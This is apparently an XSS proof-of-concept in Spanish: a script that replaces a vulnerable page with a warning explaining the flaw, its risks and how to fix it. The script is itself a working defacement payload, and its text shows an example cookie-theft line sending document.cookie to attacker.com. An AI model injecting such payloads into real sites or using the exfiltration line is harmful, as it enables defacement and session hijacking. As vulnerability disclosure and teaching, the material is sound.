<script>
document.documentElement.innerHTML = `
  <head>
    <title>Error XSS detectado</title>
    <style>
      body {
        background-color: black;
        color: #00ff00;
        font-family: monospace;
        text-align: center;
        padding: 40px;
      }
      h1 {
        font-size: 3em;
        margin-bottom: 20px;
        color: #ff0000;
        animation: blink 1s infinite;
      }
      @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
      }
      .box {
        background: #111;
        border: 1px solid lime;
        padding: 20px;
        border-radius: 10px;
        max-width: 800px;
        margin: auto;
        text-align: left;
      }
      h2 {
        color: cyan;
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <h1>⚠️ El sitio tiene un error XSS ⚠️</h1>
    <div class="box">
      <h2>¿Qué es esto?</h2>
      <p>El sitio está mostrando contenido sin filtrar directamente desde la URL, lo que permite ejecutar código JavaScript en el navegador del usuario.</p>
      
      <h2>Riesgos potenciales</h2>
      <ul>
        <li>🔐 Robo de cookies de sesión (puede permitir acceso no autorizado a cuentas).</li>
        <li>🎯 Redirecciones a sitios maliciosos (phishing).</li>
        <li>🕵️ Registro de lo que el usuario escribe (keyloggers).</li>
        <li>📄 Suplantación de formularios (robo de credenciales).</li>
      </ul>

      <h2>Ejemplo de robo de cookies:</h2>
      <code>fetch('https://attacker.com/steal?cookie=' + document.cookie)</code>

      <h2>¿Cómo solucionarlo?</h2>
      <ul>
        <li>✅ Escapar correctamente el contenido antes de insertarlo en HTML (<code>htmlspecialchars</code>, <code>textContent</code>).</li>
        <li>✅ Usar una política de seguridad de contenido (CSP) para bloquear scripts no autorizados.</li>
        <li>✅ Validar y sanitizar todos los parámetros recibidos del usuario.</li>
      </ul>
    </div>
  </body>
`;
</script>
